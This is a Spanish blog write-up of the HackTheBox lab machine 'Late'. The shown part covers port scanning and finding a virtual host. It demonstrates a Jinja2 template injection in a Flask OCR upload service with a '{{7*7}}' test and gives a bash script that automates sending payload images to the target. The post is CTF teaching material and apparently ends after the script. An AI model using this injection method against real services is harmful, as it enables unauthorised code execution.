<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Late" /><meta property="og:locale" content="en" /><meta name="description" content="Máquina Linux donde al enumerar encontramos un servicio web abierto que aplicaba Virtual Hosting y nos permitia llegar a otra web con un programa para convertir imágenes a texto Optical Character Recognotion (OCR) con el framework Flask, el cuál era vulnerable a SSTI con un payload basado en el template Jinja. Logramos Remote Code Execution (RCE), leemos la llave privada y conseguimos la shell por SSH. Para la escalada tiramos de pspy y encontramos un script cron que ejecutaba el usuario root cada vez que un usuario entraba por SSH, además aplicaba una asignación de atributo para poder modificar el archivo de una manera peculiar pero sencilla. Por último, agregamos un comando al script para asignar permisos SUID a la bash, volvemos a iniciar sesión por SSH, ejecutamos la bash en modo privilegiado y obtenemos la shell como root" /><meta property="og:description" content="Máquina Linux donde al enumerar encontramos un servicio web abierto que aplicaba Virtual Hosting y nos permitia llegar a otra web con un programa para convertir imágenes a texto Optical Character Recognotion (OCR) con el framework Flask, el cuál era vulnerable a SSTI con un payload basado en el template Jinja. Logramos Remote Code Execution (RCE), leemos la llave privada y conseguimos la shell por SSH. Para la escalada tiramos de pspy y encontramos un script cron que ejecutaba el usuario root cada vez que un usuario entraba por SSH, además aplicaba una asignación de atributo para poder modificar el archivo de una manera peculiar pero sencilla. Por último, agregamos un comando al script para asignar permisos SUID a la bash, volvemos a iniciar sesión por SSH, ejecutamos la bash en modo privilegiado y obtenemos la shell como root" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBLate/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBLate/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-09T17:43:13-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Late" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-09T17:43:13-05:00","datePublished":"2022-05-09T17:43:13-05:00","description":"Máquina Linux donde al enumerar encontramos un servicio web abierto que aplicaba Virtual Hosting y nos permitia llegar a otra web con un programa para convertir imágenes a texto Optical Character Recognotion (OCR) con el framework Flask, el cuál era vulnerable a SSTI con un payload basado en el template Jinja. Logramos Remote Code Execution (RCE), leemos la llave privada y conseguimos la shell por SSH. Para la escalada tiramos de pspy y encontramos un script cron que ejecutaba el usuario root cada vez que un usuario entraba por SSH, además aplicaba una asignación de atributo para poder modificar el archivo de una manera peculiar pero sencilla. Por último, agregamos un comando al script para asignar permisos SUID a la bash, volvemos a iniciar sesión por SSH, ejecutamos la bash en modo privilegiado y obtenemos la shell como root","headline":"Hackthebox Writeup Late","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBLate/"},"url":"https://e1p0tr0.github.io/posts/HTBLate/"}</script><title>Hackthebox Writeup Late | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Late</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Late</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1652136193" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2570 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><p>Máquina Linux donde al enumerar encontramos un servicio web abierto que aplicaba <strong>Virtual Hosting</strong> y nos permitia llegar a otra web con un programa para convertir imágenes a texto <strong>Optical Character Recognotion (OCR)</strong> con el framework <strong>Flask</strong>, el cuál era vulnerable a <strong>SSTI</strong> con un payload basado en el template <strong>Jinja</strong>. Logramos <strong>Remote Code Execution (RCE)</strong>, leemos la llave privada y conseguimos la shell por <strong>SSH</strong>. Para la escalada tiramos de <strong>pspy</strong> y encontramos un script <strong>cron</strong> que ejecutaba el usuario <strong>root</strong> cada vez que un usuario entraba por <strong>SSH</strong>, además aplicaba una asignación de atributo para poder modificar el archivo de una manera peculiar pero sencilla. Por último, agregamos un comando al script para asignar permisos <strong>SUID</strong> a la <strong>bash</strong>, volvemos a iniciar sesión por <strong>SSH</strong>, ejecutamos la <strong>bash</strong> en modo privilegiado y obtenemos la shell como <strong>root</strong></p><hr /><p><img data-src="/assets/img/htb/writeups/late/logo.png" alt="LateLogo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.156<td style="text-align: center">23 Apr 2022<td style="text-align: center">Easy<td style="text-align: center">20</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.156
PING 10.10.11.156 <span class="o">(</span>10.10.11.156<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.156: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>116 ms
					  <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.156 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 115.778/115.778/115.778/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Con <code class="language-plaintext highlighter-rouge">nmap</code> realizamos un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir puertos abiertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- --open -sS --min-rate 5000 -n 10.10.11.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-09 18:10 -05
Nmap scan report for 10.10.11.156
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh      
              \_________ Secure Shell Protocol
80/tcp open  http     
              \_________ HyperText Transfer Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>--open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-v : Imprimir información del proceso del escaneo</p></blockquote><p>Ahora escaneamos de manera específica los puertos <strong>22 (SSH) - 80 (HTTP)</strong> en cuestión:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p 22,80 -sCV -oN targetTCP 10.10.11.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-09 18:15 -05
Nmap scan report for images.late.htb (10.10.11.156)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Image Reader
|_http-server-header: nginx/1.14.0 (Ubuntu)
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Ya que no disponemos de credenciales para entrar por <strong>SSH</strong>, empezamos con el servicio web que corre por el puerto <strong>80 (HTTP)</strong>:</p><blockquote><p>Con <code class="language-plaintext highlighter-rouge">whatweb</code> podemos ver tecnologías que usa el sitio</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb http://10.10.11.156
</span><span class="gp">http://10.10.11.156 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[#</span>,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov <span class="o">(</span>GetTemplate.com<span class="o">)]</span>, Script, Title[Late - Best online image tools], nginx[1.14.0]
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Si quieres una opción gráfica puedes usar en tu navegador la extensión <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a> y ver las tecnologías</p></div></blockquote><blockquote><p>Con <code class="language-plaintext highlighter-rouge">Firefox</code> podemos ver el sitio web</p></blockquote><p><img data-src="/assets/img/htb/writeups/late/http_ip.png" alt="HTTP/IP" class="shadow" data-proofer-ignore></p><p>Solo encontramos de interesante el subdominio <code class="language-plaintext highlighter-rouge">images.late.htb</code>, lo agregamos a nuestro archivo <em>/etc/hosts</em>: <code class="language-plaintext highlighter-rouge">echo "10.10.11.156 images.late.htb" &gt;&gt; /etc/hosts</code> para aplicar <strong>Virtual hosting</strong>:</p><p><img data-src="/assets/img/htb/writeups/late/http_images_late.png" alt="HTTP/SUBDOAMIN" class="shadow" data-proofer-ignore></p><blockquote><p>Tambien podemos encontrar el subdominio usando <code class="language-plaintext highlighter-rouge">curl</code></p></blockquote><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ curl <span class="nt">-s</span> <span class="s2">"http://10.10.11.156"</span> | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s2">"http.*htb"</span> | <span class="nb">sort</span> <span class="nt">-u</span>
http://images.late.htb
</pre></table></code></div></div><p>Observamos una web con la funcionalidad de <strong>convertir una imagen a texto</strong> usando <strong>Flask</strong>. Averiguamos en internet para entender mejor los conceptos:</p><blockquote><p>¿ Qué es <code class="language-plaintext highlighter-rouge">Flask</code> ?</p></blockquote><p><img data-src="/assets/img/htb/writeups/late/flask_concept.png" alt="FLaskConcept" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Mas información: <a href="https://pythonbasics.org/what-is-flask-python/">https://pythonbasics.org/what-is-flask-python/</a></p></div></blockquote><blockquote><p>¿ Qué es la tecnología <code class="language-plaintext highlighter-rouge">OCR</code> ?</p></blockquote><p><img data-src="/assets/img/htb/writeups/late/ocr_concept.png" alt="OCRConcept" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Mas información: <a href="https://www.ibm.com/cloud/blog/optical-character-recognition">https://www.ibm.com/cloud/blog/optical-character-recognition</a></p></div></blockquote><p>Está muy claro que solo nos permite subir imágenes (.png, .jpeg), pero que tal si intentamos engañar al programa pasandole un archivo <strong>.png</strong> con una cadena de texto: <code class="language-plaintext highlighter-rouge">echo 'testing' &gt; test.png</code></p><p><img data-src="/assets/img/htb/writeups/late/test.png" alt="Testing" class="shadow" data-proofer-ignore></p><p>Ojito!, vemos un mensaje de error y recibimos la ruta completa del archivo subido. Como es costumbre, los usuarios se ubican en la ruta <code class="language-plaintext highlighter-rouge">home</code>, con ello podemos deducir que existe un usuario llamado <code class="language-plaintext highlighter-rouge">svc_acc</code></p><blockquote class="prompt-tip"><div><p>Buscando aplicaciones <strong>OCR</strong> que usen <code class="language-plaintext highlighter-rouge">Flask</code>, encontramos un repositorio de <code class="language-plaintext highlighter-rouge">GitHub</code> con una interfaz muy similar: <a href="https://github.com/lucadibello/ImageReader">https://github.com/lucadibello/ImageReader</a></p></div></blockquote><p>Examinando que réquisitos necesita observamos <code class="language-plaintext highlighter-rouge">Jinja2</code>. Además, con la información sobre <a href="https://flask.palletsprojects.com/en/2.1.x/">Flask</a> sabemos que depende del template <code class="language-plaintext highlighter-rouge">Jinja2</code></p><blockquote><p>¿ Qué es Jinja ?</p></blockquote><p><img data-src="/assets/img/htb/writeups/late/jinja_concept.png" alt="JinjaConcept" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Más información: <a href="https://palletsprojects.com/p/jinja/">https://palletsprojects.com/p/jinja/</a></p></div></blockquote><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Con la idea de como trabaja por detrás este software procedemos a buscar vulnerabilidades y encontramos un posible <strong><code class="language-plaintext highlighter-rouge">SSTI</code> (Server Site Template Injection)</strong> que proviene del Template <code class="language-plaintext highlighter-rouge">Jinja</code> que usa el framework <code class="language-plaintext highlighter-rouge">Flask</code>:</p><blockquote><p>Validamos que es vulnerable:</p></blockquote><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>❯ convert <span class="nt">-pointsize</span> 18 label:<span class="s1">'{ { 7 * 7 } }'</span> test.png
     <span class="se">\_</span>________________________________________________ Create image from a text

❯ curl <span class="nt">-is</span> <span class="nt">-XPOST</span> <span class="nt">-F</span> <span class="s2">"file=@test.png"</span> http://images.late.htb/scanner
     <span class="se">\_</span>________________________________________________ Transfer data to server

HTTP/1.1 200 OK
Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Tue, 10 May 2022 05:45:00 GMT
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 10
Connection: keep-alive
Content-Disposition: attachment<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span>results.txt
Last-Modified: Tue, 10 May 2022 05:45:00 GMT
Cache-Control: no-cache
ETag: <span class="s2">"1652161500.115982-10-372837928"</span>

&lt;p&gt;49 ______________________________ Vulnerable to SSTI <span class="o">!</span>
&lt;/p&gt; 
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p><strong>convert</strong> :</p><p>-pointsize &lt;number&gt;: Asignar tamaño a la fuente del texto</p><p>label:&lt;text&gt; : Asignar texto a convertir</p><p><strong>curl</strong> :</p><p>-is : Incluir cabezeras en la respuesta HTTP y ocultar medidor de progreso/posibles errores</p><p>-F “&lt;form-field_name&gt;=@&lt;file_name&gt;”: Permite subir archivos/data por POST</p></blockquote><blockquote class="prompt-tip"><div><p>Para hacer la conversión puedes usar muchas herramientas <code class="language-plaintext highlighter-rouge">online</code>, y para la petición, la misma web te dara la respuesta en un <code class="language-plaintext highlighter-rouge">.txt</code>. También puedes usar <code class="language-plaintext highlighter-rouge">burpsuite</code> para visualizar la respuesta.</p></div></blockquote><blockquote class="prompt-info"><div><p>Mas información sobre <strong>SSTI Flask</strong>: <a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/">https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/</a></p></div></blockquote><p>Al intentar subir imágenes nos dimos cuenta que el <strong>tamaño de la letra</strong> y probablemente <strong>la fuente</strong>, afectan la ejecución de la inyeccción.</p><p>Para conseguir la ejecución hice un script en <code class="language-plaintext highlighter-rouge">bash</code>al cuál le pasas un payload del template <code class="language-plaintext highlighter-rouge">Jinja</code>; aplicando <code class="language-plaintext highlighter-rouge">Bypassing '_'</code> y quitando las llaves <code class="language-plaintext highlighter-rouge">{ { } }</code>; para luego probar con diferentes <strong>fuentes</strong> y <strong>tamaños</strong>, validar que la conversión se realizo correctamente y ejecutarlo:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># Script to find the font and size for payload execution</span>

<span class="c"># extract fonts</span>
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> fonts.txt <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span>curl <span class="nt">-s</span> https://www.azfonts.net/fonts/popular | <span class="nb">grep</span> <span class="s2">"font-item__title"</span> <span class="nt">-A</span> 1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"font-item__title"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">"&gt;"</span> <span class="s1">'{print $2}'</span> | <span class="nb">sed</span> <span class="s1">'s/&lt;\/strong//g'</span> | <span class="nb">tr</span> <span class="nt">-s</span> <span class="s1">'\n'</span> | <span class="nb">sed</span> <span class="s1">'51,100d'</span>
<span class="k">fi</span>

<span class="c"># variables</span>
<span class="nv">c</span><span class="o">=</span>1
<span class="nv">payload</span><span class="o">=</span><span class="nv">$1</span>
<span class="nv">url</span><span class="o">=</span><span class="s2">"http://images.late.htb/scanner"</span>

<span class="k">while </span><span class="nb">read </span>font<span class="p">;</span> <span class="k">do
        </span>clear
        <span class="nb">sleep </span>2
        <span class="nb">echo</span> <span class="nv">$c</span> <span class="s2">"[+] "</span><span class="nv">$font</span>
        <span class="nv">size</span><span class="o">=</span>8
        <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 20<span class="si">)</span><span class="p">;</span> <span class="k">do
                </span><span class="nv">data</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo </span>Size : <span class="nv">$size</span> - Fontsize : <span class="nv">$font</span><span class="si">)</span>
                convert <span class="nt">-pointsize</span> <span class="nv">$size</span> <span class="nt">-font</span> <span class="s2">"</span><span class="nv">$font</span><span class="s2">"</span> label:<span class="s2">"</span><span class="nv">$payload</span><span class="s2">"</span> data.png
                <span class="nb">sleep </span>0.5
                <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">"</span> <span class="s2">"Fontsize : </span><span class="nv">$size</span><span class="s2">"</span>
                <span class="nv">output</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-is</span> <span class="nt">-XPOST</span> <span class="nt">-F</span> <span class="s2">"file=@data.png"</span> <span class="nv">$url</span> | <span class="nb">grep</span> <span class="s2">"&lt;p&gt;"</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
                <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">"</span> <span class="nv">$output</span>
                <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$output</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$payload</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
                        </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Same payload -&gt; "</span> <span class="nv">$data</span>
                        <span class="nb">exec</span><span class="o">=</span><span class="s2">"{ { </span><span class="nv">$payload</span><span class="s2"> } }"</span>
                        convert <span class="nt">-pointsize</span> <span class="nv">$size</span> <span class="nt">-font</span> <span class="s2">"</span><span class="nv">$font</span><span class="s2">"</span> label:<span class="s2">"</span><span class="nv">$exec</span><span class="s2">"</span> data.png
                        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[+] Payload converted to execution:</span><span class="se">\n</span><span class="s2">"</span>
                        curl <span class="nt">-s</span> <span class="nt">-XPOST</span> <span class="nt">-F</span> <span class="s2">"file=@data.png"</span> <span class="nv">$url</span>
                        <span class="nb">exit </span>1
                <span class="k">fi
                </span><span class="nb">let </span>size+<span class="o">=</span>2
        <span class="k">done
        </span><span class="nb">let </span>c+<span class="o">=</span>1
<span class="k">done</span> &lt; fonts.txt
